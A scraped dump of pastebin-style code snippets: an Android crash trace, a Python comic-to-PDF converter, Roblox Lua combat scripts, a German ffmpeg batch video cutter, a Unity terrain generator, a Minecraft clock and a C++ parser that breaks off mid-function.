+Vm5j6pHB,2025-06-08T23:38:43.104,powerampache,PHP,Sunday 8th of June 2025 04:38:44 PM CDT,"1.00-69 (69) - DB: 83
+java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
+	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
+	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
+	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
+	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
+	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
+	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
+
+"
+c8jkbfjd,CBZ to PDF converter,RedstoneHair,Python,Sunday 8th of June 2025 04:26:18 PM CDT,"import os
+import sys
+import zipfile
+import shutil
+from PIL import Image
+from PyPDF2 import PdfMerger
+from slashr import SlashR
+
+sr = None
+
+DIR = """" or (
+	sys.argv[1] 
+	if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]) 
+	else input(""Directory: "")
+)
+
+def progress(done: int, total: int):
+    sr.print(f""{done} / {total}"")
+
+def handle_file(path):
+    if not path.lower().endswith("".cbz""):
+        return
+    print(f""PROCESS {os.path.basename(path)}"")
+    temp_dir = os.path.join(DIR, ""temp"")
+    pdf_dir = os.path.join(DIR, ""temp_pdfs"")
+    if os.path.exists(temp_dir):
+        shutil.rmtree(temp_dir)
+    if os.path.exists(pdf_dir):
+        shutil.rmtree(pdf_dir)
+    os.makedirs(temp_dir)
+    os.makedirs(pdf_dir)
+    with zipfile.ZipFile(path, 'r') as zip_ref:
+        file_list = zip_ref.namelist()
+        total_steps = len(file_list) * 2 + 1
+        for i, file in enumerate(file_list):
+            zip_ref.extract(file, temp_dir)
+            progress(i + 1, total_steps)
+    images = sorted([
+        os.path.join(temp_dir, f)
+        for f in os.listdir(temp_dir)
+        if f.lower().endswith(("".png"", "".jpg"", "".jpeg"", "".bmp"", "".webp""))
+    ])
+    if images:
+        pdf_paths = []
+        for i, img_path in enumerate(images):
+            pdf_path = os.path.join(pdf_dir, f""{i}.pdf"")
+            img = Image.open(img_path).convert(""RGB"")
+            img.save(pdf_path, ""PDF"", resolution=100.0)
+            img.close()
+            pdf_paths.append(pdf_path)
+            progress(len(file_list) + i + 1, total_steps)
+        merger = PdfMerger()
+        for pdf in pdf_paths:
+            merger.append(pdf)
+        out_path = os.path.splitext(path)[0] + "".pdf""
+        merger.write(out_path)
+        merger.close()
+        progress(total_steps - 1, total_steps)
+    shutil.rmtree(temp_dir)
+    shutil.rmtree(pdf_dir)
+    progress(total_steps, total_steps)
+
+def main():
+    global sr
+    for file in os.listdir(DIR):
+        path = os.path.join(DIR, file)
+        if os.path.isfile(path):
+            with SlashR() as sr:
+                handle_file(path)
+
+if __name__ == ""__main__"":
+    main()
+"
+pxhrFtYn,Untitled,XXsuperninjaXXop,Lua,Sunday 8th of June 2025 03:58:12 PM CDT,"local Players = game:GetService(""Players"")
+local RunService = game:GetService(""RunService"")
+
+local player = Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local humanoid = char:WaitForChild(""Humanoid"")
+local rootPart = char:WaitForChild(""HumanoidRootPart"")
+
+local keybind = require(game.ReplicatedStorage.CoolModules.Keybind)
+
+local dirteffect = char[""Left Leg""].LeftFootAttachment:WaitForChild(""DirtEffect"")
+
+local FrontDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Forward)
+local LeftDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Left)
+local RightDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Right)
+local BackDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Back)
+
+local dashConfig = {
+	speed = 90,
+	cdtime = 2.5,
+	duration = 0.3, 
+	maxforce = Vector3.new(1, 0, 1) * 300000,
+	minvelocity = 0.2
+}
+
+local dashState = {
+	canDash = true,
+	isDashing = false,
+	dashStartTime = 0
+}
+
+local action = keybind.GetAction(""Fight"", ""Dash"")
+action.KeyboardBinding.KeyCode = Enum.KeyCode.Q
+action.GamepadBinding.KeyCode = Enum.KeyCode.ButtonX
+action.KeyboardBinding.UIButton = player.PlayerGui.MobileButtons.Frame.DashButton
+keybind.EnableContext(""Fight"")
+
+local dashCDIcon = player.PlayerGui.Cooldowns.Frame.Dash
+
+local function getDashDirection()
+	local moveDirection = humanoid.MoveDirection
+	if moveDirection.Magnitude == 0 then
+		moveDirection = rootPart.CFrame.LookVector
+	end
+
+	local relativeDirection = rootPart.CFrame:VectorToObjectSpace(moveDirection)
+
+	local forwardDot = relativeDirection.Z
+	local rightDot = relativeDirection.X
+
+	local threshold = 0.5
+
+	if forwardDot > threshold then
+		return BackDash
+	elseif forwardDot < -threshold then
+		return FrontDash
+	elseif rightDot > threshold then
+		return RightDash
+	elseif rightDot < -threshold then
+		return LeftDash
+	else
+		return FrontDash
+	end
+end
+
+local function Dash()
+	if not dashState.canDash then return end
+	script.SFX.dash:Play()
+	dashCDIcon.BackgroundTransparency = 0.7
+	dashCDIcon.ImageTransparency = 0.7
+	dashCDIcon.UIStroke.Transparency = 0.7
+	if humanoid.FloorMaterial ~= Enum.Material.Air then
+		local rayOrigin = rootPart.Position
+		local rayDirection = Vector3.new(0, -5, 0)
+
+		local raycastParams = RaycastParams.new()
+		raycastParams.FilterDescendantsInstances = {player.Character}
+		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+
+		local result = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
+
+		if result and result.Instance then
+			local partColor = result.Instance.Color
+			local grayishColor = Color3.fromHex(""#a19691"")
+
+			local startColor = grayishColor:Lerp(partColor, 0.7)
+			local endColor = grayishColor:Lerp(partColor, 0.7)
+
+			dirteffect.Color = ColorSequence.new{
+				ColorSequenceKeypoint.new(0, startColor),
+				ColorSequenceKeypoint.new(0.674, partColor),
+				ColorSequenceKeypoint.new(1, endColor)
+			}
+
+		end
+		dirteffect.Enabled = true
+	end
+	
+	
+	local currentanim :AnimationTrack
+	dashState.canDash = false
+	dashState.isDashing = true
+	dashState.dashStartTime = os.clock()
+
+	currentanim = getDashDirection()
+	
+	local direction
+	if humanoid.MoveDirection.Magnitude > 0 then
+		direction = humanoid.MoveDirection.Unit
+	else
+		direction = rootPart.CFrame.LookVector
+	end
+	
+	local relativeDirection = char.HumanoidRootPart.CFrame:VectorToObjectSpace(char.Humanoid.MoveDirection)
+	
+	
+	currentanim:Play(0.05)
+	local bodyVelocity = Instance.new(""BodyVelocity"")
+	bodyVelocity.MaxForce = dashConfig.maxforce
+	bodyVelocity.Velocity = direction * dashConfig.speed * 5
+	bodyVelocity.Parent = rootPart
+	
+	local dashConnection
+	local reductionFactor = 1
+	dashConnection = RunService.Heartbeat:Connect(function()
+		local elapsed = os.clock() - dashState.dashStartTime
+		
+		if humanoid.MoveDirection.Magnitude > 0 then
+			direction = humanoid.MoveDirection.Unit
+		else
+			direction = rootPart.CFrame.LookVector
+		end
+		if elapsed < dashConfig.duration and 
+			rootPart.AssemblyLinearVelocity.Magnitude > dashConfig.speed * dashConfig.minvelocity then
+			bodyVelocity.Velocity = direction * dashConfig.speed * reductionFactor
+			reductionFactor -= 0.05
+		else
+			dashState.isDashing = false
+			bodyVelocity:Destroy()
+			dashConnection:Disconnect()
+			task.wait(0.1)
+			dirteffect.Enabled = false
+		end
+	end)
+	task.delay(dashConfig.cdtime + dashConfig.duration, function()
+		dashState.canDash = true
+		if bodyVelocity then bodyVelocity:Destroy() end
+		
+		dashCDIcon.BackgroundTransparency = 0.4
+		dashCDIcon.ImageTransparency = 0.4
+		dashCDIcon.UIStroke.Transparency = 0.4
+		
+	end)
+end
+
+
+action.Pressed:Connect(function()
+	if dashState.canDash then
+		task.spawn(Dash)
+	end
+end)
+"
+Vyt1wU6h,weapons code,XXsuperninjaXXop,Lua,Sunday 8th of June 2025 03:56:51 PM CDT,"local module = {}
+
+-- Cache frequently accessed objects
+local Debris = game:GetService(""Debris"")
+local slashEffects = game.ReplicatedStorage.SlashEffects:GetChildren()
+local numSlashEffects = #slashEffects
+
+function module.DamageHandler(tool:Tool|BasePart, hit:BasePart, knockback:number?,DoSlashes:boolean?,CritBoost:number?)
+	local hitParent = hit.Parent
+	local toolParent = tool.Parent
+	if not hitParent or not toolParent then return end
+	local hitHumanoid = hitParent:FindFirstChild(""Humanoid"")
+	local toolHumanoid = toolParent:FindFirstChild(""Humanoid"")
+	local hitTeam = hitParent:FindFirstChild(""Team"")
+	local toolTeam = toolParent:FindFirstChild(""Team"")
+	
+	if not (hitHumanoid and toolHumanoid and hitTeam and toolTeam) then return end
+	
+	-- 0 is npcs 1 is players 3 is pvp players
+	if (toolTeam.Value == 3 and hitTeam.Value == 1) or (toolTeam.Value == 1 and hitTeam.Value == 3) then
+		return
+	end
+
+	if hitParent == toolParent or (toolTeam.Value ~= 3 and toolTeam.Value == hitTeam.Value) then
+		return
+	end
+	
+	local dmg = tool.Damage
+	if not dmg then return end
+
+	if CritBoost and CritBoost > 1 and tool:FindFirstChild(""CritSlash"") then
+		tool.CritSlash:Play()
+	elseif tool:FindFirstChild(""Slash"") then
+		tool.Slash:Play()
+		CritBoost = 1
+	else
+		CritBoost = 1
+	end
+	
+	
+	local char = toolParent
+	local hitRootPart = hitParent:FindFirstChild(""HumanoidRootPart"")
+	if not hitRootPart then return end
+	
+	local player = game.Players:GetPlayerFromCharacter(toolParent)
+	if player then
+		local tag = Instance.new(""ObjectValue"")
+		tag.Value = player
+		tag.Name = ""creator""
+		tag.Parent = hitHumanoid
+		game:GetService(""Debris""):AddItem(tag, 0.5)
+	end
+	
+	local shield = hitParent:FindFirstChild(""Shield"") 
+	if shield and shield:FindFirstChild(""Health"") then
+		local angle = math.acos(hitRootPart.CFrame.LookVector:Dot((toolParent.HumanoidRootPart.Position - hitRootPart.Position).Unit))
+		if angle < math.pi/2 then
+			shield.Health.Value = math.max(0, shield.Health.Value - (dmg.Value * CritBoost))
+			return
+		end
+	end
+	
+	if DoSlashes and hitRootPart:FindFirstChild(""SlashesGUI"") then
+		local randomSlash = slashEffects[math.random(1, numSlashEffects)]:Clone()
+		if CritBoost > 1 then
+			randomSlash.ImageColor3 = Color3.fromRGB(255, 0, 0)
+			randomSlash.ImageTransparency = 0
+		end
+		randomSlash.Parent = hitRootPart.SlashesGUI
+	end
+
+	local healthValue = hitHumanoid:FindFirstChild(""Health"")
+	if healthValue and healthValue:IsA(""NumberValue"") then
+		hitHumanoid.Health.Value -= dmg.Value * CritBoost
+	else
+		hitHumanoid.Health -= dmg.Value * CritBoost
+	end
+	
+	if knockback then
+		hitRootPart.AssemblyLinearVelocity = (hitRootPart.Position - toolParent.HumanoidRootPart.Position).Unit * knockback
+	end
+end
+
+return module"
+7XBMKJDb,Batch Video Cutter & Encoder,EurenikZ,Bash,Sunday 8th of June 2025 03:46:12 PM CDT,":: Dieses Skript verarbeitet alle .mp4-Dateien im aktuellen Verzeichnis, entfernt die angegebenen Sekunden vom Anfang und Ende und komprimiert sie optional per FFmpeg mit einem wählbaren CRF-Wert. Nur Videos mit ausreichender Länge (Videolänge + 3 > Schnittbereich) werden bearbeitet. Der ursprüngliche Zeitstempel der Datei bleibt erhalten, und die Ausgabedateien erhalten angepasste Namen (_cut.mp4 oder _crfXX.mp4).
+:: ""ffmpeg-release-essentials.zip"" hier herunterladen, entpacken und aus dem Ordner ""bin"" die ffmpeg.exe und ffprobe.exe in das Verzeichnis kopieren: https://www.gyan.dev/ffmpeg/builds/
+
+@echo off
+setlocal enabledelayedexpansion
+:: Benutzerabfrage: Start-Sekunden schneiden
+set /p CUT_START=Wie viele Sekunden vom ANFANG sollen entfernt werden?
+if ""%CUT_START%""=="""" set CUT_START=0
+:: Benutzerabfrage: End-Sekunden schneiden
+set /p CUT_END=Wie viele Sekunden vom ENDE sollen entfernt werden?
+if ""%CUT_END%""=="""" set CUT_END=0
+:: Benutzerabfrage: CRF-Wert
+echo CRF-Wert (18=hoch, 23=normal, 28=niedrig) – Leer lassen = nur schneiden (kein Re-Encoding)
+set /p CRF_WERT=Welcher CRF-Wert soll verwendet werden? 
+:: Zahlenpruefung fuer CUT_START und CUT_END (Batch-only)
+for /f ""delims=0123456789"" %%A in (""%CUT_START%"") do (
+	echo Ungueltige Eingabe bei Startzeit & pause & exit /b
+)
+for /f ""delims=0123456789"" %%A in (""%CUT_END%"") do (
+	echo Ungueltige Eingabe bei Endzeit & pause & exit /b
+)
+:: Wenn CRF-Wert gesetzt, auf Zahl pruefen, sonst ignorieren
+if not ""%CRF_WERT%""=="""" (
+	for /f ""delims=0123456789"" %%A in (""%CRF_WERT%"") do (
+		echo Ungueltige Eingabe bei CRF-Wert & pause & exit /b
+	)
+)
+:: Schleife ueber alle MP4-Dateien
+for %%F in (*.mp4) do (
+	echo Bearbeite: %%F
+	:: Urspruengliches aenderungsdatum sichern
+	for /f ""usebackq delims="" %%T in (`powershell -NoLogo -NoProfile -Command ""(Get-Item '%%F').LastWriteTimeUtc.ToString('yyyy-MM-ddTHH:mm:ss')""`) do (
+		set ""TIMESTAMP=%%T""
+	)
+	:: Gesamtdauer ermitteln
+	for /f ""usebackq delims="" %%D in (`ffprobe -v error -select_streams v:0 -show_entries format^=duration -of default^=nokey^=1:noprint_wrappers^=1 ""%%F""`) do (
+		set ""DURATION=%%D""
+	)
+	:: Ganze Sekunden extrahieren
+	for /f ""tokens=1 delims=."" %%T in (""!DURATION!"") do set /a INTDURATION=%%T
+	
+	:: Berechnungen
+	set /a CUTS_TOTAL=!CUT_START!+!CUT_END!
+	set /a VIDEO_PLUS_3=!INTDURATION!+3
+	
+	:: Debug
+	echo   Video: !INTDURATION!s, Cuts: !CUTS_TOTAL!s, Video+3: !VIDEO_PLUS_3!s
+	echo   Pruefung 1: !VIDEO_PLUS_3! GTR !CUTS_TOTAL! = ?
+	
+	:: Pruefung: Video+3 > Cuts UND genug zum Schneiden uebrig
+	if !VIDEO_PLUS_3! GTR !CUTS_TOTAL! (
+		echo   Pruefung 1: JA
+		set /a REMAINING=!INTDURATION!-!CUTS_TOTAL!
+		echo   Remaining: !REMAINING!s
+		if !REMAINING! GEQ 1 (
+			echo   Pruefung 2: JA - wird bearbeitet
+			if ""%CRF_WERT%""=="""" (
+				set ""OUTFILE=%%~nF_cut.mp4""
+				ffmpeg -y -ss !CUT_START! -i ""%%F"" -t !REMAINING! -c copy ""!OUTFILE!""
+			) else (
+				set ""OUTFILE=%%~nF_crf!CRF_WERT!.mp4""
+				ffmpeg -y -ss !CUT_START! -i ""%%F"" -t !REMAINING! -c:v libx265 -crf !CRF_WERT! -preset slow -movflags +faststart -c:a aac -b:a 160k ""!OUTFILE!""
+			)
+			:: aenderungsdatum zuruecksetzen
+			powershell -NoLogo -NoProfile -Command ""(Get-Item '!OUTFILE!').LastWriteTimeUtc = [datetime]::ParseExact('!TIMESTAMP!', 'yyyy-MM-ddTHH:mm:ss', $null)""
+			echo ? Fertig: !OUTFILE! - !REMAINING!s uebrig
+		) else (
+			echo ? uebersprungen: %%F - nur !REMAINING!s wuerden uebrig bleiben
+		)
+	) else (
+		echo ? uebersprungen: %%F - !VIDEO_PLUS_3! nicht > !CUTS_TOTAL!
+	)
+)
+echo.
+echo Alle passenden Videos wurden verarbeitet.
+pause"
+BUegYJNU,procgen,TannerBoBanner,C#,Sunday 8th of June 2025 03:28:31 PM CDT,"using NUnit.Framework;
+using System.Collections;
+using System.Collections.Generic;
+using System.Linq;
+using UnityEngine;
+using static ProcGen;
+using static UnityEditor.PlayerSettings;
+
+public class ProcGen : MonoBehaviour
+{
+    public Dictionary<Vector2Int, Cell> Grid = new Dictionary<Vector2Int, Cell>();
+
+    public GameObject grassPrefab;
+    public GameObject sandPrefab;
+    public GameObject waterPrefab;
+    public GameObject forestPrefab;
+
+    //variables that determine grid size and distance between cells
+    public int chunks = 10;
+    public int amplitude = 100;
+
+    public List<Chunk> AllChunks = new List<Chunk>
+    {
+    new //Grass Chunk
+        (
+        ""Grass"",
+        new List<WeightedChunk> //AllowedLeft
+        {
+            new(""Grass"", 5f),
+            new(""Forest"", 2f),
+            new(""Beach"", 1f),
+            new (""Water"", 1f),
+        },
+        new List<WeightedChunk> //AllowedRight
+        {
+            new(""Grass"", 5f),
+            new(""Forest"", 2f),
+            new(""Beach"", 1f),
+            new (""Water"", 1f),
+        },
+        new List<WeightedChunk>
+        {
+            new(""Grass"", 5f),
+            new(""Forest"", 2f),
+            new(""Beach"", 1f),
+            new (""Water"", 1f),
+        },
+        new List<WeightedChunk>
+        {
+            new(""Grass"", 5f),
+            new(""Forest"", 2f),
+            new(""Beach"", 1f),
+            new (""Water"", 1f),
+        }
+        ),
+    new //Forest Chunk
+        (
+        ""Forest"",
+        new List<WeightedChunk> //AllowedLeft
+        {
+            new(""Grass"", 2f),
+            new(""Forest"", 5f),
+            new (""Water"", 1f),
+            new (""Beach"", 1f),
+        },
+        new List<WeightedChunk> //AllowedRight
+        {
+            new(""Grass"", 2f),
+            new(""Forest"", 5f),
+            new (""Water"", 1f),
+            new (""Beach"", 1f),
+        },
+        new List<WeightedChunk>
+        {
+            new(""Grass"", 2f),
+            new(""Forest"", 5f),
+            new (""Water"", 1f),
+            new (""Beach"", 1f),
+        },
+        new List<WeightedChunk>
+        {
+            new(""Grass"", 2f),
+            new(""Forest"", 5f),
+            new (""Water"", 1f),
+            new (""Beach"", 1f),
+        }
+        ),
+    new //Beach Chunk
+        (
+        ""Beach"",
+        new List<WeightedChunk> //AllowedLeft
+        {
+            new (""Grass"", 1f),
+            new (""Forest"", 1f),
+            new (""Water"", 30f),
+            new (""Beach"", 10f),
+        },
+        new List<WeightedChunk> //AllowedRight
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 30f),
+            new (""Beach"", 10f),
+            new (""Forest"", 1f),
+        },
+        new List<WeightedChunk>
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 30f),
+            new (""Forest"", 1f),
+            new (""Beach"", 10f),
+        },
+        new List<WeightedChunk>
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 30f),
+            new (""Beach"", 10f),
+            new (""Forest"", 1f),
+        }
+        ),
+    new //Water Chunk
+        (
+        ""Water"",
+        new List<WeightedChunk> //AllowedLeft
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 10f),
+            new (""Forest"", 1f),
+            new (""Beach"", 3f),
+        },
+        new List<WeightedChunk> //AllowedRight
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 10f),
+            new (""Forest"", 1f),
+            new (""Beach"", 3f),
+        },
+        new List<WeightedChunk>
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 10f),
+            new (""Forest"", 1f),
+            new (""Beach"", 3f),
+        },
+        new List<WeightedChunk>
+        {
+            new (""Grass"", 1f),
+            new (""Water"", 10f),
+            new (""Forest"", 1f),
+            new (""Beach"", 3f),
+        }
+        )
+
+    };
+
+    readonly Vector2Int[] directions = new Vector2Int[]
+    {
+        Vector2Int.up, Vector2Int.down, Vector2Int.left, Vector2Int.right
+    };
+
+
+
+    // Start is called once before the first execution of Update after the MonoBehaviour is created
+    void Start()
+    {
+        for(var x = 0; x<chunks; x++) //creates grid
+        {
+            for (var y = 0; y<chunks; y++)
+            {
+                Grid[new Vector2Int(x, y)] = new Cell();
+                Grid[new Vector2Int(x, y)].worldPos = new Vector2(x * amplitude, y * amplitude);
+                print(""Current cell at "" + x + "", "" + y + "" is now set to worldPos "" + x*amplitude + "", "" + y*amplitude);
+            }
+        }
+
+        int safety = 1000;
+        while (Grid.Values.Any(cell => cell.placedChunk == null) && safety-- > 0)
+        {
+            GenerateChunks();
+        }
+
+        if (safety <= 0)
+        {
+            Debug.LogError(""Infinite loop detected — generation did not finish."");
+        }
+
+        
+    }
+
+    // Update is called once per frame
+    void Update()
+    {
+        
+    }
+
+    void GenerateChunks()
+    {
+        if (Grid.Values.All(cell => cell.possibleChunks.Count == 0))
+        {
+            Debug.LogError(""All remaining cells have no possible chunks — generation failed."");
+            return;
+        }
+
+        List<Vector2Int> lowestEntropyCells = new List<Vector2Int>();
+
+        foreach (var kvp in Grid) //step 1: determine possible chunks at each cell
+        {
+            Vector2Int pos = kvp.Key;
+            Cell cell = kvp.Value;
+
+            if (cell.placedChunk != null) continue;
+            cell.possibleChunks = GetPossibleChunksForCell(pos);
+
+        }
+
+        int entropy = int.MaxValue; //make a list of cells with lowest entropy
+        foreach (var kvp in Grid)
+        {
+            Vector2Int pos = kvp.Key;
+            Cell cell = kvp.Value;
+
+            if (cell.possibleChunks.Count == 0) continue;
+
+            if (cell.possibleChunks.Count < entropy)
+            {
+                entropy = cell.possibleChunks.Count;
+                lowestEntropyCells = new List<Vector2Int>
+                {
+                    pos
+                };
+            }
+            else if (cell.possibleChunks.Count == entropy)
+            {
+                lowestEntropyCells.Add(pos);
+            }
+        }
+
+        if (lowestEntropyCells == null || lowestEntropyCells.Count == 0)
+        {
+            Debug.LogError(""No cells with valid options left. Stopping generation."");
+            return;
+        }
+
+
+
+        //step 2: randomly pick a cell from the lowest possible cells
+
+        PickChunk(lowestEntropyCells[Random.Range(0, lowestEntropyCells.Count)]);
+        
+        //step 4: determine possible chunks at said cell
+        //step 3: randomly generate a cell based on weightings
+    }
+
+    void PickChunk(Vector2Int pos)
+    {
+        List<WeightedChunk> validChunks = GetWeightedoptionsForCell(pos);
+
+        float weight = 0f;
+        foreach (var kvp in validChunks) 
+        {
+            weight += kvp.weight;
+            kvp.weight = weight;
+        }
+
+        float rand = Random.Range(0, weight);
+
+        foreach (var kvp in validChunks)
+        {
+            if (rand <= kvp.weight)
+            {
+                Grid[pos].placedChunk = AllChunks.First(c => c.name == kvp.name);
+                print(""Set chunk at "" + pos.x + "", "" + pos.y + "" To "" + kvp.name);
+
+                
+                return;
+            }
+        }
+    }
+
+    List<string> GetPossibleChunksForCell(Vector2Int cellPos)
+    {
+        List<string> validChunks = null;
+
+        foreach(var dir in directions)
+        {
+            Vector2Int neighborPos = cellPos + dir;
+
+            if (!Grid.ContainsKey(neighborPos)) continue;
+
+            Chunk neighbor = Grid[neighborPos].placedChunk;
+
+            if (neighbor == null) continue;
+
+            List<WeightedChunk> allowed = GetAllowedChunksFrom(neighbor, dir);
+            List<string> names = allowed.Select(wc => wc.name).ToList();
+
+            if (validChunks == null)
+            {
+                validChunks = new List<string>(names);
+            }
+            else
+            {
+                validChunks = validChunks.Intersect(names).ToList();
+            }
+        }
+        return validChunks ?? AllChunks.Select(wc => wc.name).ToList();
+    }
+
+    List<WeightedChunk> GetWeightedoptionsForCell(Vector2Int cellPos)
+    {
+        Dictionary<string, float> chunkWeights = new Dictionary<string, float>();
+
+        foreach (var dir in directions)
+        {
+            Vector2Int neighborPos = cellPos + dir; //gets position of neighbor in current direction
+
+            if (!Grid.ContainsKey(neighborPos)) continue; //skips if the selected grid position doesn't exist (edge)
+
+            Chunk neighbor = Grid[neighborPos].placedChunk; //sets chunk to currently placed chunk at location
+            if (neighbor == null) continue; //if there is no chunk there, skip it
+
+            List<WeightedChunk> allowed = GetAllowedChunksFrom(neighbor, dir); //gets allowed chunk from neighbor if found
+            foreach (var wc in allowed) //for each allowed chunk, add weight to chunkweights
+            {
+                if (!chunkWeights.ContainsKey(wc.name)) //if chunk weights doesnt have this chunk, add it and set it to it's weight
+                    chunkWeights[wc.name] = wc.weight;
+                else //if chunk weights has this chunk already, add weight to it from the selected cell
+                    chunkWeights[wc.name] += wc.weight;
+            }
+
+        }
+        if (chunkWeights.Count == 0) //if no chunks were found in neighbors, failsafe to set all chunks equally, so it randomly chooses the first chunk
+        {
+            return AllChunks.Select(chunk => new WeightedChunk(chunk.name, 1f)).ToList();
+        }
+
+        List<string> valid = GetPossibleChunksForCell(cellPos); //filter weights to remove all weights that aren't allowed by all neighbors
+        return chunkWeights
+            .Where(kvp => valid.Contains(kvp.Key)) //removed any weighted option that doesn't exist in valid
+            .Select(kvp => new WeightedChunk(kvp.Key, kvp.Value)) //convert chunkWeights keys and values to weightedChunk format
+            .ToList(); //combine to a list to return
+    }
+
+    List<WeightedChunk> GetAllowedChunksFrom(Chunk neighbor, Vector2Int dir)
+    {
+        if (dir == Vector2Int.up) return neighbor.AllowedBottom;   // Because we're above
+        if (dir == Vector2Int.down) return neighbor.AllowedTop;    // Because we're below
+        if (dir == Vector2Int.left) return neighbor.AllowedRight;
+        if (dir == Vector2Int.right) return neighbor.AllowedLeft;
+        return new List<WeightedChunk>();
+    }
+}
+
+public class Chunk
+{
+    public string name;
+
+    public List<WeightedChunk> AllowedLeft;
+    public List<WeightedChunk> AllowedRight;
+    public List<WeightedChunk> AllowedTop; 
+    public List<WeightedChunk> AllowedBottom;  
+
+    public Chunk(string name, List<WeightedChunk> allowedLeft, List<WeightedChunk> allowedRight, List<WeightedChunk> allowedTop, List<WeightedChunk> allowedBottom)
+    {
+        this.name = name;
+        AllowedLeft = allowedLeft;
+        AllowedRight = allowedRight;
+        AllowedTop = allowedTop;
+        AllowedBottom = allowedBottom;
+    }
+}
+
+public class Cell
+{
+    public Vector2 worldPos;
+    public Chunk placedChunk;
+    public List<string> possibleChunks;
+
+    public Cell()
+    {
+        this.possibleChunks = new List<string> {""Grass"", ""Water"", ""Beach"", ""Forest"" };
+    }
+}
+
+public class WeightedChunk
+{
+    public string name;
+    public float weight;
+
+    public WeightedChunk(string name, float weight)
+    {
+        this.name = name;
+        this.weight = weight;
+    }
+}
+
+
+
+
+"
+AFQaNgja,Clock 3x2,Rukerisu,Lua,Sunday 8th of June 2025 02:40:34 PM CDT,"local monitor = peripheral.find(""monitor"")
+if not monitor then
+  print(""Monitor not connected!"")
+  return
+end
+
+monitor.setBackgroundColor(colors.black)
+monitor.setTextScale(1.5)
+monitor.clear()
+
+
+local function writeLineCentered(y, text, color)
+  local w, _ = monitor.getSize()
+  local x = math.floor((w - #text) / 2) + 1
+  monitor.setCursorPos(x, y)
+  monitor.setTextColor(color)
+  monitor.write(text)
+end
+
+while true do
+  monitor.clear()
+
+
+  local _, h = monitor.getSize()
+
+
+  local startY = math.floor((h - 4) / 2) + 1
+
+
+  local realTime = textutils.formatTime(os.time(""local""), true)
+  local gameTime = textutils.formatTime(os.time(), true)
+
+
+  writeLineCentered(startY, ""Real Time"", colors.orange)
+  writeLineCentered(startY + 1, realTime, colors.green)
+
+
+  writeLineCentered(startY + 3, ""Minecraft Time"", colors.orange)
+  writeLineCentered(startY + 4, gameTime, colors.green)
+
+  sleep(0.1)
+end
+"
+EF2sUWtz,Untitled,w3ntz,C++,Sunday 8th of June 2025 01:47:32 PM CDT,"#include <iostream>
+#include <string>
+#include <fstream>
+using namespace std;
+struct var {
+	string name;
+	string n;
+};
+struct node {
+	var info;
+	node* next;
+};
+void add(node*& head, var n) {
+	node* q = new node;
+	q->next = NULL;
+	q->info = n;
+	if (head == NULL) {
+		head = q;
+	}
+	else {
+		node* p = head;
+		while (p->next != NULL) {
+			p = p->next;
+		}
+		p->next = q;
+	}
+}
+void ch(node*& head, var n) {
+	node* p = head;
+	bool b = false;
+	while (p && !b) {
+		if (p->info.name == n.name) {
+			p->info.n = n.n;
+			b = true;
+		}
+		p = p->next;
+	}
+	if (!b)
+		add(head, n);
+}
+string find(string& name, node*& head) {
+	node* p = head;
+	while (p) {
+		if (p->info.name == name) {
+			return p->info.n;
+		}
+	}
+	return ""-"";
+}
+int defop(char g) {
+	switch (g) {
+	case '|': // диз
+		return 0;
+		break;
+	case '&': // кон
+		return 1;
+		break;
+	case '+': // слож
+		return 2;
+		break;
+	case '-': // имп
+		return 3;
+		break;
+	case '*': // шеф
+		return 4;
+		break;
+	case ';':
+		return 5;
+		break;
+	case ' ':
+		return 5;
+		break;
+	default:
+		return -1;
+	}
+}
+bool f(node*& vars) {
+	ifstream in(""in.txt"");
+	int condition = 0;
+	int op = 0;
+	char c;
+	string name;
+	int idxname = 0;
+	string n;
+	int idxn = 0;
+	string n1;
+	int idxn1 = 0;
+	string name1;
+	while (in >> c) {
+		switch (condition) {
+		case 0:
+			if (isdigit(c) || isalpha(c)) {
+				if (idxname == 0 && isdigit(c))
+					condition = -1;
+				else {
+					name += c;
+				}
+			}
+			else if (c == ':')
+				condition = 1;
+			else
+				condition = -1;
+			break;
+		case 1:
+			if (c == '=')
+				condition = 1;
+			else if (isalpha(c)) {
+				condition = 2;
+				name1 = c;
+			}
+			else if (c == '0' || c == '1') {
+				condition = 3;
+				idxn = 1;
+				n = c;
+			}
+			else
+				condition = -1;
+			break;
+		case 2:
+			if (isalpha(c) || isdigit(c)) {
+				name1 += c;
+			}
+			else if (c == ' ' || c == ';') {
+				n = find(name1, vars);
+				if (n == ""-"") 
+					condition = -1;
+				else {
+					var t;
+					t.n = n;
+					t.name = name;
+					name = """";
+					idxname = 0;
+					ch(vars, t);
+					condition = 0;
+				}
+			}
+			else {
+				op = defop(c);
+				if (op == -1)
+					condition = -1;
+				else
+					condition = 4;
+			}
+			break;
+		case 3:
+			if (idxn < 8) {
